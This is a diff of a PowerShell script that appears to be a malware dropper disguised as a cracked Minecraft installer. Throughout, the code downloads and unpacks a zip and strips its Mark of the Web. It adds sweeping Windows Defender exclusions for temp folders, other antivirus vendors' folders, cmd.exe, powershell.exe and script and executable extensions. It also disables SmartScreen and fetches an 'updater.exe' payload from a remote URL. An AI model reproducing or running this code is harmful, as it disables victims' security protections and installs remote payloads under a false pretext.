@@ -57,188 +57,193 @@ if (Test-Path -Path $payloadPath) {
         Add-Content -Path $logPath -Value "Execution failed: $_"
         throw "Failed to execute existing payload."
     }
-} else {
-    Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Proceeding with installation process without execution."
+}
 
-    Add-Content -Path $logPath -Value "Checking for existing CrackedSoftware folder at $crackedSoftwareFolder."
-    if (-not (Test-Path -Path $crackedSoftwareFolder)) {
-        Add-Content -Path $logPath -Value "CrackedSoftware folder not found. Downloading from $crackedSoftwareZipUrl..."
-
-        try {
-            if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
-                New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
-                Add-Content -Path $logPath -Value "Created directory for cracked software zip: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
-            }
-
-            $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
-            Add-Content -Path $logPath -Value "Cracked software zip downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
-
-            if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
-                throw "Downloaded zip file not found at $crackedSoftwareZipPath."
-            }
-
-            try {
-                Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
-                Add-Content -Path $logPath -Value "Extracted cracked software to $crackedSoftwareFolder."
-            } catch {
-                Add-Content -Path $logPath -Value "Failed to extract cracked software zip: $_"
-                throw "Extraction failed."
-            }
-
-            if (-not (Test-Path -Path $crackedSoftwareExe)) {
-                Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
-                throw "Cracked software executable missing."
-            }
-
-            try {
-                Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
-                Add-Content -Path $logPath -Value "Removed Mark of the Web from files in $crackedSoftwareFolder."
-            } catch {
-                Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
-            }
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to download or process cracked software zip: $_"
-        }
-    } else {
-        Add-Content -Path $logPath -Value "CrackedSoftware folder already exists at $crackedSoftwareFolder."
-        if (-not (Test-Path -Path $crackedSoftwareExe)) {
-            Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
-        } else {
-            Add-Content -Path $logPath -Value "Confirmed: MineCraft_AutoInstaller.exe exists in $crackedSoftwareFolder."
-        }
-    }
-
-    Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
-    $maxAttempts = 20
-    $delayBetweenChecks = 5
-
-    for ($i = 0; $i -lt $maxAttempts; $i++) {
-        try {
-            $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
-            $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
-            if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
-                Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
-                break
-            }
-        } catch {
-            Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
-        }
-        Start-Sleep -Seconds $delayBetweenChecks
-        if ($i -eq ($maxAttempts - 1)) {
-            Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
-        }
-    }
-    Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
-
-    Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
-
-    $exclusionsPaths = @(
-        "C:\Users\Public\SystemLib",
-        "C:\Windows\Temp\updater.exe",
-        "C:\Windows\Temp\CrackedSoftware",
-        "C:\Windows\Temp\cracked_software.zip",
-        "C:\ProgramData\WinKit",
-        "C:\Windows\Temp\*",
-        "C:\ProgramData\Microsoft\Windows\Temp",
-        "C:\Users\*\AppData\Local\Temp",
-        "C:\Windows\System32\Tasks",
-        "C:\Windows\SysWOW64\Tasks",
-        "C:\Program Files\McAfee",
-        "C:\Program Files\Symantec",
-        "C:\Program Files\Kaspersky Lab",
-        "C:\Program Files\Avast Software",
-        "C:\Program Files\AVG"
-    )
-
-    $exclusionsProcesses = @(
-        "updater.exe",
-        "MineCraft_AutoInstaller.exe",
-        "cmd.exe",
-        "powershell.exe"
-    )
-
-    $exclusionsExtensions = @(
-        "exe",
-        "dll",
-        "bat",
-        "cmd",
-        "ps1",
-        "vbs",
-        "js",
-        "zip"
-    )
-
-    foreach ($excl in $exclusionsPaths) {
-        try {
-            $currentExclusions = Get-MpPreference
-            $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
-            if (-not $pathExists) {
-                Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
-                Add-Content -Path $logPath -Value "Exclusion path added: $excl"
-            } else {
-                Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
-            }
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
-        }
-    }
-
-    foreach ($excl in $exclusionsProcesses) {
-        try {
-            $currentExclusions = Get-MpPreference
-            $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
-            if (-not $processExists) {
-                Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
-                Add-Content -Path $logPath -Value "Exclusion process added: $excl"
-            } else {
-                Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
-            }
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
-        }
-    }
-
-    foreach ($excl in $exclusionsExtensions) {
-        try {
-            $currentExclusions = Get-MpPreference
-            $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
-            if (-not $extensionExists) {
-                Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
-                Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
-            } else {
-                Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
-            }
-        } catch {
-            Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
-        }
-    }
-
-    Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
-
-    Add-Content -Path $logPath -Value "Attempting to disable SmartScreen and fetch updater.exe..."
+Add-Content -Path $logPath -Value "Checking for existing CrackedSoftware folder at $crackedSoftwareFolder."
+if (-not (Test-Path -Path $crackedSoftwareFolder)) {
+    Add-Content -Path $logPath -Value "CrackedSoftware folder not found. Downloading from $crackedSoftwareZipUrl..."
 
     try {
-        $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+        if (-not (Test-Path -Path (Split-Path -Path $crackedSoftwareZipPath -Parent))) {
+            New-Item -ItemType Directory -Path (Split-Path -Path $crackedSoftwareZipPath -Parent) -Force | Out-Null
+            Add-Content -Path $logPath -Value "Created directory for cracked software zip: $(Split-Path -Path $crackedSoftwareZipPath -Parent)."
+        }
+
+        $zipResponse = Invoke-WebRequest -Uri $crackedSoftwareZipUrl -OutFile $crackedSoftwareZipPath -UseBasicParsing -TimeoutSec 60 -PassThru
+        Add-Content -Path $logPath -Value "Cracked software zip downloaded to $crackedSoftwareZipPath. Content-Type: $($zipResponse.Headers['Content-Type'])"
+
+        if (-not (Test-Path -Path $crackedSoftwareZipPath)) {
+            throw "Downloaded zip file not found at $crackedSoftwareZipPath."
+        }
+
         try {
-            Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
-            Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
+            Expand-Archive -Path $crackedSoftwareZipPath -DestinationPath $crackedSoftwareFolder -Force -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Extracted cracked software to $crackedSoftwareFolder."
         } catch {
-            Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
+            Add-Content -Path $logPath -Value "Failed to extract cracked software zip: $_"
+            throw "Extraction failed."
         }
 
-        $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
-        if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
-            Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
+        if (-not (Test-Path -Path $crackedSoftwareExe)) {
+            Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
+            throw "Cracked software executable missing."
+        }
+
+        try {
+            Unblock-File -Path "$crackedSoftwareFolder\*" -ErrorAction Stop
+            Add-Content -Path $logPath -Value "Removed Mark of the Web from files in $crackedSoftwareFolder."
+        } catch {
+            Add-Content -Path $logPath -Value "Failed to remove Mark of the Web from $crackedSoftwareFolder files: $_"
+        }
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to download or process cracked software zip: $_"
+    }
+} else {
+    Add-Content -Path $logPath -Value "CrackedSoftware folder already exists at $crackedSoftwareFolder."
+    if (-not (Test-Path -Path $crackedSoftwareExe)) {
+        Add-Content -Path $logPath -Value "Warning: MineCraft_AutoInstaller.exe not found in $crackedSoftwareFolder."
+    } else {
+        Add-Content -Path $logPath -Value "Confirmed: MineCraft_AutoInstaller.exe exists in $crackedSoftwareFolder."
+    }
+}
+
+Add-Content -Path $logPath -Value "Waiting for Windows Defender service to be fully ready..."
+$maxAttempts = 20
+$delayBetweenChecks = 5
+
+for ($i = 0; $i -lt $maxAttempts; $i++) {
+    try {
+        $defenderService = Get-Service -Name WinDefend -ErrorAction Stop
+        $mpStatus = Get-MpComputerStatus -ErrorAction SilentlyContinue
+        if ($defenderService.Status -eq 'Running' -and $mpStatus.RealTimeProtectionEnabled -eq $true) {
+            Add-Content -Path $logPath -Value "Windows Defender service is running and Real-time Protection is enabled."
+            break
+        }
+    } catch {
+        Add-Content -Path $logPath -Value "Attempt $($i+1): Defender service not yet found or ready. Error: $_. Waiting..."
+    }
+    Start-Sleep -Seconds $delayBetweenChecks
+    if ($i -eq ($maxAttempts - 1)) {
+        Add-Content -Path $logPath -Value "WARNING: Max attempts reached. Defender may not be fully ready. Proceeding with exclusions."
+    }
+}
+Add-Content -Path $logPath -Value "Finished adaptive wait. Proceeding with Defender exclusions."
+
+Add-Content -Path $logPath -Value "Attempting to add Windows Defender exclusions."
+
+$exclusionsPaths = @(
+    "C:\Users\Public\SystemLib",
+    "C:\Windows\Temp\updater.exe",
+    "C:\Windows\Temp\CrackedSoftware",
+    "C:\Windows\Temp\cracked_software.zip",
+    "C:\ProgramData\WinKit",
+    "C:\Windows\Temp\*",
+    "C:\ProgramData\Microsoft\Windows\Temp",
+    "C:\Users\*\AppData\Local\Temp",
+    "C:\Windows\System32\Tasks",
+    "C:\Windows\SysWOW64\Tasks",
+    "C:\Program Files\McAfee",
+    "C:\Program Files\Symantec",
+    "C:\Program Files\Kaspersky Lab",
+    "C:\Program Files\Avast Software",
+    "C:\Program Files\AVG"
+)
+
+$exclusionsProcesses = @(
+    "updater.exe",
+    "MineCraft_AutoInstaller.exe",
+    "cmd.exe",
+    "powershell.exe"
+)
+
+$exclusionsExtensions = @(
+    "exe",
+    "dll",
+    "bat",
+    "cmd",
+    "ps1",
+    "vbs",
+    "js",
+    "zip"
+)
+
+foreach ($excl in $exclusionsPaths) {
+    try {
+        $currentExclusions = Get-MpPreference
+        $pathExists = ($currentExclusions.ExclusionPath | Where-Object { $_ -eq $excl }) -ne $null
+        if (-not $pathExists) {
+            Add-MpPreference -ExclusionPath $excl -ErrorAction SilentlyContinue
+            Add-Content -Path $logPath -Value "Exclusion path added: $excl"
         } else {
-            Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
+            Add-Content -Path $logPath -Value "Exclusion path already exists: $excl"
         }
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to add exclusion path: $excl - Error: $_"
+    }
+}
 
+foreach ($excl in $exclusionsProcesses) {
+    try {
+        $currentExclusions = Get-MpPreference
+        $processExists = ($currentExclusions.ExclusionProcess | Where-Object { $_ -eq $excl }) -ne $null
+        if (-not $processExists) {
+            Add-MpPreference -ExclusionProcess $excl -ErrorAction SilentlyContinue
+            Add-Content -Path $logPath -Value "Exclusion process added: $excl"
+        } else {
+            Add-Content -Path $logPath -Value "Exclusion process already exists: $excl"
+        }
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to add exclusion process: $excl - Error: $_"
+    }
+}
+
+foreach ($excl in $exclusionsExtensions) {
+    try {
+        $currentExclusions = Get-MpPreference
+        $extensionExists = ($currentExclusions.ExclusionExtension | Where-Object { $_ -eq $excl }) -ne $null
+        if (-not $extensionExists) {
+            Add-MpPreference -ExclusionExtension $excl -ErrorAction SilentlyContinue
+            Add-Content -Path $logPath -Value "Exclusion extension added: $excl"
+        } else {
+            Add-Content -Path $logPath -Value "Exclusion extension already exists: $excl"
+        }
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to add exclusion extension: $excl - Error: $_"
+    }
+}
+
+Add-Content -Path $logPath -Value "Finished attempting to add Windows Defender exclusions."
+
+Add-Content -Path $logPath -Value "Attempting to disable SmartScreen..."
+
+try {
+    $smartScreenPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer"
+    try {
+        Set-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -Value "Off" -ErrorAction Stop
+        Add-Content -Path $logPath -Value "SmartScreen disabled successfully."
+    } catch {
+        Add-Content -Path $logPath -Value "Failed to disable SmartScreen: $_"
+    }
+
+    $smartScreenEnabled = Get-ItemProperty -Path $smartScreenPath -Name "SmartScreenEnabled" -ErrorAction SilentlyContinue
+    if ($smartScreenEnabled -and $smartScreenEnabled.SmartScreenEnabled -eq "Off") {
+        Add-Content -Path $logPath -Value "Confirmed: SmartScreen is disabled."
+    } else {
+        Add-Content -Path $logPath -Value "SmartScreen status: $($smartScreenEnabled.SmartScreenEnabled) or not configured."
+    }
+} catch {
+    Add-Content -Path $logPath -Value "Failed to check SmartScreen status: $_"
+}
+
+if (-not (Test-Path -Path $payloadPath)) {
+    Add-Content -Path $logPath -Value "No existing updater.exe found at $payloadPath. Downloading updater.exe..."
+
+    try {
         if (-not (Test-Path -Path (Split-Path -Path $payloadPath -Parent))) {
             New-Item -ItemType Directory -Path (Split-Path -Path $payloadPath -Parent) -Force | Out-Null
             Add-Content -Path $logPath -Value "Created payload directory: $(Split-Path -Path $payloadPath -Parent)."
         }
 
-        Add-Content -Path $logPath -Value "Downloading updater.exe from $payloadUrl..."
         $webResponse = Invoke-WebRequest -Uri $payloadUrl -OutFile $payloadPath -UseBasicParsing -TimeoutSec 60 -PassThru
         Add-Content -Path $logPath -Value "EXE payload downloaded to $payloadPath. Content-Type: $($webResponse.Headers['Content-Type'])"
 
@@ -261,7 +266,6 @@ if (Test-Path -Path $payloadPath) {
         }
 
         Add-Content -Path $logPath -Value "Updater.exe downloaded successfully but not executed, as per configuration."
-
     } catch {
         Add-Content -Path $logPath -Value "Failed to fetch updater.exe from $payloadUrl. Error: $_"
     }
